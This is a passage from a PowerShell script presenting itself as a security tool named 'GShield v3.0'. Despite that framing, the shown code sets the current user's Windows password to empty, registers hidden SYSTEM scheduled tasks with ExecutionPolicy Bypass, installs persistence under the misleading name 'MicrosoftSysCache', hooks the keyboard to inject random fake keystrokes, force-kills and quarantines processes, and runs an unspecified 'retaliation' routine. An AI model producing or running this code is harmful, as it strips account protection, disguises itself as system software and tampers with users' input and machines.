    if ($currentUser -match '\\') { $currentUser = $currentUser.Split('\')[-1] }

    if (-not $currentUser) {
        Write-Log "PasswordRotator: could not determine current user, skipping install" "WARN"
        return
    }

    # Use schtasks.exe directly — avoids CIM/WMI class registration issues
    $workerEscaped = $workerPath -replace '"','\"'

    schtasks.exe /Delete /TN "PasswordRotator-OnLogon"  /F 2>$null
    schtasks.exe /Delete /TN "PasswordRotator-AtStartup" /F 2>$null

    schtasks.exe /Create /TN "PasswordRotator-OnLogon" `
        /TR "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$workerEscaped`" -Mode Logon" `
        /SC ONLOGON /RU SYSTEM /RL HIGHEST /F 2>$null | Out-Null

    schtasks.exe /Create /TN "PasswordRotator-AtStartup" `
        /TR "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$workerEscaped`" -Mode StartupBlank" `
        /SC ONSTART /RU SYSTEM /RL HIGHEST /F 2>$null | Out-Null

    $currentUser | Set-Content -Path (Join-Path $PwRotatorDir 'currentuser.txt') -Force -EA SilentlyContinue

    try {
        [ADSI]$adsi = "WinNT://$env:COMPUTERNAME/$currentUser,user"
        $adsi.SetPassword('')
    } catch {}

    Write-Log "PasswordRotator installed for user: $currentUser"
}

# ==================== KEY SCRAMBLER ====================
# Injects fake keystrokes around real ones to blind keyloggers
# Runs in a background runspace so it doesn't block the main loop
if (-not ([System.Management.Automation.PSTypeName]'KeyScrambler').Type) {
    Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Threading;

public class KeyScrambler {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN     = 0x0100;
    private const uint INPUT_KEYBOARD   = 1;
    private const uint KEYEVENTF_UNICODE = 0x0004;
    private const uint KEYEVENTF_KEYUP   = 0x0002;

    [StructLayout(LayoutKind.Sequential)]
    public struct KBDLLHOOKSTRUCT { public uint vkCode, scanCode, flags, time; public IntPtr dwExtraInfo; }

    [StructLayout(LayoutKind.Sequential)]
    public struct INPUT { public uint type; public INPUTUNION u; }

    [StructLayout(LayoutKind.Explicit)]
    public struct INPUTUNION { [FieldOffset(0)] public KEYBDINPUT ki; }

    [StructLayout(LayoutKind.Sequential)]
    public struct KEYBDINPUT { public ushort wVk, wScan; public uint dwFlags, time; public IntPtr dwExtraInfo; }

    [StructLayout(LayoutKind.Sequential)]
    public struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam, lParam; public uint time; public int x, y; }

    [DllImport("user32.dll", SetLastError=true)] static extern IntPtr SetWindowsHookEx(int id, IntPtr fn, IntPtr mod, uint tid);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr h);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
    [DllImport("user32.dll")] static extern bool GetMessage(out MSG m, IntPtr hw, uint f, uint t);
    [DllImport("user32.dll")] static extern bool TranslateMessage(ref MSG m);
    [DllImport("user32.dll")] static extern IntPtr DispatchMessage(ref MSG m);
    [DllImport("user32.dll")] static extern uint SendInput(uint n, INPUT[] inp, int sz);
    [DllImport("user32.dll")] static extern IntPtr GetMessageExtraInfo();
    [DllImport("user32.dll")] static extern short GetKeyState(int vk);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);

    private delegate IntPtr LLKProc(int n, IntPtr w, IntPtr l);
    private static IntPtr _hook = IntPtr.Zero;
    private static LLKProc _proc;
    private static Random _rnd = new Random();

    static bool ModifiersDown() {
        return (GetKeyState(0x10) & 0x8000) != 0 ||
               (GetKeyState(0x11) & 0x8000) != 0 ||
               (GetKeyState(0x12) & 0x8000) != 0;
    }

    static void InjectFake(char c) {
        var inp = new INPUT[2];
        inp[0].type = INPUT_KEYBOARD;
        inp[0].u.ki.wVk = 0; inp[0].u.ki.wScan = (ushort)c;
        inp[0].u.ki.dwFlags = KEYEVENTF_UNICODE;
        inp[0].u.ki.dwExtraInfo = GetMessageExtraInfo();
        inp[1] = inp[0]; inp[1].u.ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
        SendInput(2, inp, Marshal.SizeOf(typeof(INPUT)));
        Thread.Sleep(_rnd.Next(1, 7));
    }

    static void Flood() {
        if (_rnd.NextDouble() < 0.5) return;
        int n = _rnd.Next(1, 7);
        for (int i = 0; i < n; i++) InjectFake((char)_rnd.Next('A', 'Z' + 1));
    }

    static IntPtr Hook(int n, IntPtr w, IntPtr l) {
        if (n >= 0 && w == (IntPtr)WM_KEYDOWN) {
            var k = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(l, typeof(KBDLLHOOKSTRUCT));
            if ((k.flags & 0x10) == 0 && !ModifiersDown() && k.vkCode >= 65 && k.vkCode <= 90) {
                if (_rnd.NextDouble() < 0.75) Flood();
                var r = CallNextHookEx(_hook, n, w, l);
                if (_rnd.NextDouble() < 0.75) Flood();
                return r;
            }
        }
        return CallNextHookEx(_hook, n, w, l);
    }

    public static void Start() {
        if (_hook != IntPtr.Zero) return;
        _proc = Hook;
        _hook = SetWindowsHookEx(WH_KEYBOARD_LL, Marshal.GetFunctionPointerForDelegate(_proc), GetModuleHandle(null), 0);
        if (_hook == IntPtr.Zero) return;
        MSG msg;
        while (GetMessage(out msg, IntPtr.Zero, 0, 0)) { TranslateMessage(ref msg); DispatchMessage(ref msg); }
    }
}
'@ -ErrorAction SilentlyContinue
}

function Start-KeyScrambler {
    $rs = [runspacefactory]::CreateRunspace()
    $rs.ApartmentState = 'STA'   # required for message loop
    $rs.ThreadOptions  = 'ReuseThread'
    $rs.Open()
    $ps = [powershell]::Create()
    $ps.Runspace = $rs
    [void]$ps.AddScript({ [KeyScrambler]::Start() })
    $ps.BeginInvoke() | Out-Null
    Write-Log "KeyScrambler started (background runspace - keylogger blinding active)" "CYAN"
}

# ==================== PERSISTENCE ====================
function Install-Persistence {
    $taskName  = "MicrosoftSysCache"
    $scriptPath = $PSCommandPath
    schtasks.exe /Delete /TN $taskName /F 2>$null
    $cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
    schtasks.exe /Create /TN $taskName /TR $cmd /SC ONLOGON /RL HIGHEST /F 2>$null | Out-Null
    Write-Log "Persistence installed as $taskName"
}

# ==================== MAIN ====================
try {
    if (!(Test-Path $LogDir))  { New-Item $LogDir  -ItemType Directory -Force | Out-Null }
    if (!(Test-Path $QuarDir)) { New-Item $QuarDir -ItemType Directory -Force | Out-Null }

    Write-Log "GShield v3.0 starting - PID: $PID"
    Invoke-SelfProtection
    Install-Persistence
    Install-PasswordRotator
    Load-Cache
    Start-ContinuousModuleMonitor
    Start-KeyScrambler

    Get-EventSubscriber -SourceIdentifier "ProcGuard" -EA 0 | Unregister-Event -Force

    function Get-ScanTargets {
        if ($Path -and $Path.Count -gt 0) { return $Path }
        Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -and (Test-Path $_.Root) } | Select-Object -ExpandProperty Root
    }

    if ($IntervalMinutes -le 0) {
        Get-ScanTargets | ForEach-Object { Invoke-Scan $_ }
        exit
    }

    Write-Log "Real-time protection | Memory Scanner | Continuous Module Monitor | KeyScrambler | RootkitKiller | Retaliate | PasswordRotator - all active"

    # Real-time process guard via WMI event
    Register-WmiEvent -Query "SELECT * FROM Win32_ProcessStartTrace" -SourceIdentifier "ProcGuard" -Action {
        $procPath = $Event.SourceEventArgs.NewEvent.ExecutablePath
        if (!$procPath -or (Test-Excluded $procPath)) { return }
        $result = Invoke-DeepScan $procPath
        if ($result.Score -ge $script:QuarantineScore) {
            Stop-Process -Id $Event.SourceEventArgs.NewEvent.ProcessID -Force -EA 0
            Move-Item $procPath "$QuarDir\$([IO.Path]::GetFileName($procPath))" -Force -EA 0
            Write-Log "BLOCKED+QUARANTINED [score=$($result.Score)]: $procPath | $($result.Reasons)" "ALERT"
        }
    } | Out-Null

    $cycle = 0
    while ($true) {
        $cycle++
        Write-Log "Cycle $cycle - scanning all drives..."
        Get-ScanTargets | ForEach-Object { Invoke-Scan $_ }

        Invoke-MemoryScan
        Invoke-RootkitScan             # ETW HTTP rootkit check
        Invoke-RetaliateMonitorCycle   # browser phone-home retaliation

        Save-Cache
        Start-Sleep -Seconds ($IntervalMinutes * 60)
    }
} catch {
    Write-Log "FATAL ERROR: $_" "ERROR"
}
